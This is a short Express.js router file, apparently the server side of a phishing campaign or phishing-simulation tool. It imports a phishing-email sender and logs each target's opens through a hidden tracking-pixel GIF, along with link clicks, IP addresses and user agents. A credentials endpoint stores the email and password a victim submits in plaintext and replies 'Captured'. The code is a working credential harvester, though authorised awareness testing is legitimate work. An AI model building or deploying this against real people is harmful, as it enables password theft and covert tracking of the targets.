import express from "express";
import Interaction from "../models/Interaction.js";
import sendPhishingEmail from "../mailer.js";

const router = express.Router();

// GET /api/track?email=...&type=open|click
router.get("/", async (req, res) => {
  const { email, type } = req.query;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];

  if (!email || !["open", "click"].includes(type)) {
    return res.status(400).send("Missing or invalid params");
  }

  await Interaction.create({
    email,
    type,
    timestamp: new Date(),
    meta: { ip, userAgent },
  });

  if (type === "open") {
    const buf = Buffer.from(
      "47494638396101000100800000ffffff00000021f90401000001002c00000000010001000002024401003b",
      "hex"
    );
    res.set("Content-Type", "image/gif").send(buf);
  } else {
    res.send("Tracked");
  }
});

// POST /api/track/credentials
router.post("/credentials", async (req, res) => {
  const { trackedEmail, email, password } = req.body;
  await Interaction.create({
    email: trackedEmail || email,
    type: "submitted",
    timestamp: new Date(),
    meta: { submittedEmail: email, submittedPassword: password },
  });
  res.send("Captured");
});
export default router;